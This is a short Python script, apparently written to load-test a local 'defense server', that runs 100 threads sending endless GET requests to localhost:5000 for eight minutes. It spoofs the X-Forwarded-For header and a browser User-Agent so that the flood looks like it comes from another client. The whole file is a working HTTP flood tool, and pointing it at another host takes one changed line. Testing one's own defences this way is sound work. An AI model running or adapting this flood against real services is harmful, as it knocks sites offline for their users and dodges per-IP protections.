import requests
import random
import threading
import time
import socket

# Configuration
TARGET_URL = "http://localhost:5000"  # Your defense server URL
THREADS = 100                         # Concurrent attack threads 100
DURATION = 480                        # Attack duration (seconds) 300 - 5min

# Attack function
def flood():
    while True:
        try:
                ip = "155.20.124.250" # Placeholder for IP spoofing
                TARGET_URL = "http://localhost:5000"  # Ensure this matches your server URL
                headers = {
                    "X-Forwarded-For": ip,  # Spoof IP in headers
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                response = requests.get(TARGET_URL, headers=headers)
                print(f"Sent request from {headers['X-Forwarded-For']} | Status: {response.status_code}")
        except Exception as e:
                print(f"Error: {e}")


# Start attack threads
threads = []
for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.daemon = True
    threads.append(t)
    t.start()

# Run for specified duration
time.sleep(DURATION)
print("Attack simulation completed.")